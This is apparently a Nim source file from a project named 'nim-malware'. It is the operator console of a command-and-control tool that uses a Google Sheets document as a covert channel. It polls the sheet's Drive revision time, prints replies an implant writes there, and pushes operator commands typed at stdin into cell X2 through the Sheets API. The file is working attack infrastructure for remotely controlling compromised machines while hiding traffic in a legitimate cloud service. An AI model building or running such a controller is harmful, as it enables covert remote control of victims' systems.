import times, strutils, std/httpclient, std/json
import ../client/getAccessToken
let clientID = parseJson(readfile("C:/Users/user/Desktop/nim-malware/client/clientID"))["web"]

let DOCID = "1fBZ9-BB09fuIIFY2coe68B-QWZaDGr8El2ISEdr28M0"

proc lastUpdated(DOCID: string): DateTime =
    # refresh token
    var DRIVE_ACCESS_TOKEN = getAccessToken(clientID[
            "drive_refresh_token"].getStr())
    # get doc from drive
    let client = newHttpClient()
    client.headers = newHttpHeaders({"Authorization": "Bearer " &
            DRIVE_ACCESS_TOKEN, "Accept": "application/json"})
    var resDoc2: JsonNode
    try:
        var res = client.getContent("https://www.googleapis.com/drive/v3/files/" &
                DOCID & "/revisions")
        resDoc2 = parseJson(res)
    finally:
        client.close()
    # echo resDoc2
    var dtString = resDoc2["revisions"][^1]["modifiedTime"].getStr()
    var parts = dtString.split('.')
    let dtFormat = "yyyy-MM-dd'T'HH:mm:ss'Z'"
    return parse(parts[0] & 'Z', dtFormat)

var oldTime = lastUpdated(DOCID)
var dt: DateTime

while true:
    dt = lastUpdated(DOCID)
    var ACCESS_TOKEN = getAccessToken(clientID["refresh_token"].getStr())

    if oldTime < dt: # its changed. echo out the results, i.e fetch from doc
        let client = newHttpClient()
        client.headers = newHttpHeaders({"Authorization": "Bearer " &
                ACCESS_TOKEN, "Accept": "application/json"})
        var resDoc2: JsonNode
        try:
            # TODO Get X2 Data only
            var resDoc = client.getContent(
                    "https://sheets.googleapis.com/v4/spreadsheets/" & DOCID & "?fields=sheets.data.rowData.values(formattedValue)&ranges=Sheet1")
            resDoc2 = parseJson(resDoc)
        finally:
            client.close()
        # Change range
        var resContent = (resDoc2["sheets"][0]["data"][0]["rowData"][0][
                "values"]).getElems()
        
        echo resContent
        oldTime = lastUpdated(DOCID)
        
    else: # take input from user for further commands
        var cmd = readLine(stdin)
        let putclient = newHttpClient()
        putclient.headers = newHttpHeaders({"Authorization": "Bearer " &
                ACCESS_TOKEN, "Accept": "application/json",
                "Content-Type": "application/json"})
        var finalURL = "https://sheets.googleapis.com/v4/spreadsheets/" &
                DOCID & "/values/X2?valueInputOption=USER_ENTERED"
        var finalbody = """{"values":[["""" & cmd & """"]]}"""
        
        try:
            var rescomn = putclient.putContent(finalURL, body = finalbody)
            echo "Waiting for reply"
        finally:
            putclient.close()